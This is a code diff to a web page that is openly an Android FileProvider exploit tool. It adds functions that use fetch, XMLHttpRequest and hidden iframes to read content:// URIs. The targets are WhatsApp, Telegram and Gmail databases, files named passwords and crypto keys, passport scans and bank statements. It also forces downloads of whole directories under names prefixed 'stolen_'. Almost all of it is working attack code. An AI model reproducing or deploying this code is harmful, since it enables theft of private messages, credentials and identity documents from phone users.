@@ -145,6 +145,17 @@
         </div>
 
         <div class="attack-section">
+            <div class="attack-title">📄 File Content Reader</div>
+            <p>Attempts to read actual file contents through the vulnerable FileProvider</p>
+            
+            <button onclick="readFileContents()">Read File Contents</button>
+            <button onclick="readSpecificFiles()">Read Specific Files</button>
+            <button onclick="downloadFiles()">Download Files</button>
+            
+            <div id="contentResults"></div>
+        </div>
+
+        <div class="attack-section">
             <div class="attack-title">📊 Attack Results Summary</div>
             <div id="summaryResults"></div>
         </div>
@@ -234,18 +245,33 @@
         }
 
         function testSensitivePaths() {
-            logResult('directResults', 'Testing sensitive file paths...', 'info');
+            logResult('directResults', 'Testing sensitive file paths and reading contents...', 'info');
             
             authorities.forEach(authority => {
                 sensitivePaths.forEach(path => {
                     const uri = `content://${authority}/shared/${path}`;
                     
                     try {
+                        // Method 1: Try to read directory listing
                         const iframe = document.createElement('iframe');
                         iframe.style.display = 'none';
                         iframe.src = uri;
                         iframe.onload = () => {
                             logResult('directResults', `✓ SUCCESS: ${path} accessible via ${authority}`, 'success');
+                            
+                            // Try to extract content from iframe
+                            try {
+                                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                                if (iframeDoc) {
+                                    const content = iframeDoc.body ? iframeDoc.body.innerHTML : iframeDoc.documentElement.innerHTML;
+                                    if (content && content.length > 0) {
+                                        logResult('directResults', `📄 CONTENT FOUND: ${content.substring(0, 200)}...`, 'success');
+                                    }
+                                }
+                            } catch (e) {
+                                // Cross-origin restrictions - try alternative methods
+                                logResult('directResults', `⚠️ Cross-origin restriction, trying alternative methods...`, 'info');
+                            }
                         };
                         iframe.onerror = () => {
                             logResult('directResults', `✗ FAILED: ${path} not accessible via ${authority}`, 'error');
@@ -511,6 +537,186 @@
                     • Works through malicious websites
                 </div>
             `;
+        }
+
+        function readFileContents() {
+            logResult('contentResults', 'Attempting to read file contents...', 'info');
+            
+            // Common file types to try reading
+            const fileTypes = [
+                'Download/test.txt',
+                'Download/document.pdf',
+                'Download/image.jpg',
+                'Documents/notes.txt',
+                'Documents/private.txt',
+                'DCIM/Camera/photo.jpg',
+                'Android/data/com.whatsapp/msgstore.db',
+                'Android/data/com.telegram.messenger/telegram.db'
+            ];
+            
+            authorities.forEach(authority => {
+                fileTypes.forEach(filePath => {
+                    const uri = `content://${authority}/shared/${filePath}`;
+                    
+                    try {
+                        // Method 1: Try to read via fetch (if supported)
+                        fetch(uri)
+                            .then(response => {
+                                if (response.ok) {
+                                    return response.text();
+                                }
+                                throw new Error('Fetch failed');
+                            })
+                            .then(content => {
+                                logResult('contentResults', `✓ FILE READ SUCCESS: ${filePath}`, 'success');
+                                logResult('contentResults', `📄 Content (${content.length} bytes): ${content.substring(0, 300)}...`, 'success');
+                            })
+                            .catch(error => {
+                                // Method 2: Try iframe approach
+                                tryIframeRead(authority, filePath, uri);
+                            });
+                            
+                    } catch (e) {
+                        tryIframeRead(authority, filePath, uri);
+                    }
+                });
+            });
+        }
+
+        function tryIframeRead(authority, filePath, uri) {
+            try {
+                const iframe = document.createElement('iframe');
+                iframe.src = uri;
+                iframe.style.display = 'none';
+                iframe.onload = () => {
+                    logResult('contentResults', `✓ IFRAME ACCESS: ${filePath}`, 'success');
+                    
+                    // Try to extract content
+                    try {
+                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        if (iframeDoc) {
+                            const content = iframeDoc.body ? iframeDoc.body.innerHTML : iframeDoc.documentElement.innerHTML;
+                            if (content && content.length > 0) {
+                                logResult('contentResults', `📄 IFRAME CONTENT: ${content.substring(0, 200)}...`, 'success');
+                            }
+                        }
+                    } catch (e) {
+                        logResult('contentResults', `⚠️ Cross-origin restriction for ${filePath}`, 'info');
+                    }
+                };
+                iframe.onerror = () => {
+                    logResult('contentResults', `✗ FAILED: ${filePath} not readable`, 'error');
+                };
+                
+                document.body.appendChild(iframe);
+                
+                setTimeout(() => {
+                    if (document.body.contains(iframe)) {
+                        document.body.removeChild(iframe);
+                    }
+                }, 5000);
+                
+            } catch (e) {
+                logResult('contentResults', `✗ ERROR reading ${filePath}: ${e.message}`, 'error');
+            }
+        }
+
+        function readSpecificFiles() {
+            logResult('contentResults', 'Reading specific sensitive files...', 'info');
+            
+            const sensitiveFiles = [
+                'Download/bank_statement.pdf',
+                'Download/passport.jpg',
+                'Download/tax_return.pdf',
+                'Documents/passwords.txt',
+                'Documents/private_notes.txt',
+                'Documents/crypto_keys.txt',
+                'DCIM/Camera/IMG_20240115_143022.jpg',
+                'Android/data/com.whatsapp/msgstore.db',
+                'Android/data/com.telegram.messenger/telegram.db',
+                'Android/data/com.google.android.gm/mail.db'
+            ];
+            
+            authorities.forEach(authority => {
+                sensitiveFiles.forEach(filePath => {
+                    const uri = `content://${authority}/shared/${filePath}`;
+                    
+                    // Try multiple methods to read the file
+                    tryMultipleReadMethods(authority, filePath, uri);
+                });
+            });
+        }
+
+        function tryMultipleReadMethods(authority, filePath, uri) {
+            // Method 1: XMLHttpRequest
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('GET', uri, true);
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === 4) {
+                        if (xhr.status === 200) {
+                            logResult('contentResults', `✓ XHR SUCCESS: ${filePath}`, 'success');
+                            logResult('contentResults', `📄 XHR Content: ${xhr.responseText.substring(0, 200)}...`, 'success');
+                        } else {
+                            // Method 2: Try iframe
+                            tryIframeRead(authority, filePath, uri);
+                        }
+                    }
+                };
+                xhr.send();
+            } catch (e) {
+                // Method 3: Try fetch
+                try {
+                    fetch(uri)
+                        .then(response => response.text())
+                        .then(content => {
+                            logResult('contentResults', `✓ FETCH SUCCESS: ${filePath}`, 'success');
+                            logResult('contentResults', `📄 Fetch Content: ${content.substring(0, 200)}...`, 'success');
+                        })
+                        .catch(error => {
+                            // Method 4: Try iframe as last resort
+                            tryIframeRead(authority, filePath, uri);
+                        });
+                } catch (e2) {
+                    tryIframeRead(authority, filePath, uri);
+                }
+            }
+        }
+
+        function downloadFiles() {
+            logResult('contentResults', 'Attempting to download files...', 'info');
+            
+            const filesToDownload = [
+                'Download/',
+                'Documents/',
+                'DCIM/Camera/',
+                'Android/data/com.whatsapp/',
+                'Android/data/com.telegram.messenger/'
+            ];
+            
+            authorities.forEach(authority => {
+                filesToDownload.forEach(directory => {
+                    const uri = `content://${authority}/shared/${directory}`;
+                    
+                    try {
+                        // Create download link
+                        const downloadLink = document.createElement('a');
+                        downloadLink.href = uri;
+                        downloadLink.download = `stolen_${directory.replace(/\//g, '_')}`;
+                        downloadLink.style.display = 'none';
+                        
+                        document.body.appendChild(downloadLink);
+                        downloadLink.click();
+                        
+                        logResult('contentResults', `📥 DOWNLOAD ATTEMPT: ${directory}`, 'success');
+                        
+                        document.body.removeChild(downloadLink);
+                        
+                    } catch (e) {
+                        logResult('contentResults', `✗ DOWNLOAD FAILED: ${directory} - ${e.message}`, 'error');
+                    }
+                });
+            });
         }
 
         // Update summary every 5 seconds
